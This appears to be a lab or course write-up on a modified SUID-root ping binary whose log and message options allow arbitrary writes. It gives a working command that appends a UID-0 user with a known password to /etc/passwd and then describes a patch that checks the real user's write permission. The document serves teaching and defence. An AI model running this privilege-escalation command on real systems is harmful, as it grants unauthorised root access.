#   1. Getting `root` rights

##  Vulnerability

By studying `ping`'s source code, we can list a lot of interesting info about its behaviour:

1. The user can log the program's output by passing an argument:

`/usr/local/bin/ping -f /path/to/log/file localhost`

2. The user append an arbitrary message to the beginning of the program's output:

`/usr/local/bin/ping -m "Arbitrary message" localhost`

3. The SUID-bit is set:

`-rwsr-x--- 1 root students 103529 Apr 26  2011 /usr/local/bin/ping`

##  Exploit

An user can use the `-c` option (count) combined with the options mentioned on 1. and 2. to make `ping` do not send any request, but only to write arbitrary data to a file:

`/usr/local/bin/ping -c 0 -m "Arbitrary data" -f /path/to/file localhost`

From 3., an attacker could take advantage of the SUID rights to write arbitrary data to files owned by `root`, even though the user that launched the process does not have access to them.

##  Attack

An example attack that was tested on the target machine is adding an entry to root-owned `/etc/passwd`. An user with the same UID as `root` and a known password can be added, then the attacker can log in as this user and consequently as `root`.

To perform this attack, we have to choose a password and encrypt it with salt. Let `test` be our password. We can use `perl` in order to encrypt it:

`perl -le 'print crypt("test","SALT")'`

So we can combine this command line to the previous information to append an entry to `/etc/passwd`:

`/usr/local/bin/ping -c 0 -f /etc/passwd -m "root2:$(perl -le 'print crypt("test","SALT")'):0:0:root2:/root:/bin/bash" localhost`

After creating the new user `root2`, we can log into it with the password `test`. Since its UID is 0 (`root`'s UID), we will effectively logged in as root.

#   Patch

On `ping.patch` there is a fix that prevents the described attack from being performed. It consists of checking if the real UID has writing permissions to the specified log file in order to open and write data to it. If this is not the case, the program will log to `stdout` instead.

This patch blocks any attempt of exploiting the SUID property of `ping` to write to files the user is not allowed to.